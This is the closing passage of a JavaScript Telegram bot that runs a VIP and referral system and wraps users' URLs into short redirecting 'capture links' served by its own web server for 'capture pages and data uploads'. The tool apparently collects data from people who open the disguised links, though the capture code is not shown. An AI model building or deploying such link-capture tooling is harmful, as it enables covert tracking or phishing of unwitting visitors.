        await ctx.answerCbQuery(getTextMsg("vip_not_enough_stars", user.lang, settings.vip_price_stars - user.stars), true);
    }
});

bot.action("activate_vip_referrals", async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);
    const settings = loadSettings();

    if (!user || user.is_banned) {
        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (user.is_vip) {
        return ctx.answerCbQuery(getTextMsg("vip_already_member", user.lang), true);
    }

    if (user.referrals >= settings.vip_price_referrals) {
        updateUser(userId, { is_vip: true, vip_activated_at: Math.floor(Date.now() / 1000), referrals: user.referrals - settings.vip_price_referrals });
        await ctx.editMessageText(getTextMsg("vip_activated_referrals_success", user.lang, settings.vip_price_referrals));
        checkAchievements(userId);
        writeLog(`User ${userId} activated VIP with referrals.`);
    } else {
        await ctx.answerCbQuery(getTextMsg("vip_not_enough_referrals", user.lang, settings.vip_price_referrals - user.referrals), true);
    }
});

bot.hears(texts.ar.my_account, async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    const userLevel = getUserLevel(user.referrals);
    const levelEmoji = getLevelEmoji(userLevel, user.lang);
    const achievements = user.achievements.length > 0 ? user.achievements.map(ach => getTextMsg(ach, user.lang)).join(", ") : getTextMsg("no_achievements", user.lang);

    const accountInfo = getTextMsg("account_info", user.lang,
        user.is_vip ? getTextMsg("yes", user.lang) : getTextMsg("no", user.lang),
        user.stars,
        user.referrals,
        user.total_captures,
        levelEmoji,
        achievements
    );

    await ctx.reply(accountInfo);
});

bot.hears(texts.ar.help, async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    await ctx.reply(getTextMsg("help_message", user.lang));
});

bot.on("text", async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    switch (user.state) {
        case "waiting_for_custom_link":
            const customLink = sanitizeInput(ctx.message.text);
            if (!customLink.startsWith("http://") && !customLink.startsWith("https://")) {
                return ctx.reply(getTextMsg("invalid_link_format", user.lang));
            }

            const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
            if (remainingCooldown > 0) {
                return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
            }

            const shortCode = generateShortCode();
            saveShortLink(shortCode, { owner_id: userId, type: 'c', redirect_url: customLink });

            const captureLink = `${config.BOT_URL}/${shortCode}`;
            await ctx.reply(getTextMsg("custom_link_generated", user.lang, captureLink));
            writeLog(`Custom link generated for user ${userId}: ${captureLink} -> ${customLink}`);
            updateUser(userId, { state: "none" });
            break;
        default:
            await ctx.reply(getTextMsg("unknown_command", user.lang), getMainMenuKeyboard(user.lang));
            break;
    }
});

const PORT = config.PORT || process.env.PORT || 3000;

// Start bot in long polling mode
bot.launch();

// Start web server for capture pages and data uploads
app.listen(PORT, () => {
    writeLog(`Web server running on port ${PORT}`);
    console.log(`Web server running on port ${PORT}`);
    console.log('Bot started in long polling mode.');
    writeLog('Bot started in long polling mode.');
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
